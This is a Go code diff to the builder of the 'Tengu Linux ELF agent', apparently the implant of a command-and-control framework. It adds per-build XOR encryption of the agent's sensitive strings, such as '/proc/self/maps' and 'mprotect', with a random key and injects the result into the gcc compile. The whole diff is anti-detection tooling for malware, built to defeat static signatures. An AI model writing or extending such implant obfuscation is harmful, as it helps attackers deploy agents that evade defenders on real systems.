@@ -2,6 +2,7 @@ package builder
 
 import (
 	"bytes"
+	crand "crypto/rand"
 	"errors"
 	"fmt"
 	"os"
@@ -215,6 +216,36 @@ func (b *TenguBuilder) TenguPatchConfig() ([]byte, error) {
 	return cfg.Build(), nil
 }
 
+// xorStr XOR-encrypts each byte of s with key and returns comma-separated hex literals.
+func xorStr(s string, key byte) string {
+	parts := make([]string, len(s))
+	for i, c := range []byte(s) {
+		parts[i] = fmt.Sprintf("0x%02x", c^key)
+	}
+	return strings.Join(parts, ",")
+}
+
+// genObfStrHeader generates obfstr_data.h with a per-build XOR key and
+// pre-encrypted string constants consumed by the SXOR macro in obfstr.h.
+func genObfStrHeader(key byte) string {
+	type entry struct{ name, val string }
+	strs := []entry{
+		{"SXOR_PROC_MAPS", "/proc/self/maps"},
+		{"SXOR_PROC_EXE", "/proc/self/exe"},
+		{"SXOR_NANOSLEEP", "nanosleep"},
+		{"SXOR_MPROTECT", "mprotect"},
+		{"SXOR_SEM_POST", "sem_post"},
+		{"SXOR_SEM_WAIT", "sem_wait"},
+		{"SXOR_URANDOM", "/dev/urandom"},
+	}
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("#define SXOR_KEY 0x%02x\n", key))
+	for _, e := range strs {
+		sb.WriteString(fmt.Sprintf("#define %s %s\n", e.name, xorStr(e.val, key)))
+	}
+	return sb.String()
+}
+
 // Build compiles the Tengu Linux ELF agent.
 func (b *TenguBuilder) Build() bool {
 	var err error
@@ -249,6 +280,19 @@ func (b *TenguBuilder) Build() bool {
 	sb.WriteByte('}')
 	array := sb.String()
 
+	// Generate per-build string obfuscation header.
+	var keyBuf [1]byte
+	crand.Read(keyBuf[:])
+	sxorKey := keyBuf[0]
+	if sxorKey == 0 {
+		sxorKey = 0x42
+	}
+	obfHeaderPath := b.CompileDir + "/obfstr_data.h"
+	if err = os.WriteFile(obfHeaderPath, []byte(genObfStrHeader(sxorKey)), 0600); err != nil {
+		b.SendConsoleMessage("Error", "failed to write obfstr header: "+err.Error())
+		return false
+	}
+
 	// Gather source files.
 	srcFiles, err := gatherCSources(b.sourcePath + "/src")
 	if err != nil {
@@ -257,9 +301,10 @@ func (b *TenguBuilder) Build() bool {
 	}
 
 	compileCmd := fmt.Sprintf(
-		"gcc -Os -s -fPIE -pie %s -I%s/include '-DCONFIG_BYTES=%s' -o %s -lcurl -lpthread -ldl",
+		"gcc -Os -s -fPIE -pie %s -I%s/include -include %s '-DCONFIG_BYTES=%s' -o %s -lcurl -lpthread -ldl",
 		strings.Join(srcFiles, " "),
 		b.sourcePath,
+		obfHeaderPath,
 		array,
 		b.outputPath,
 	)
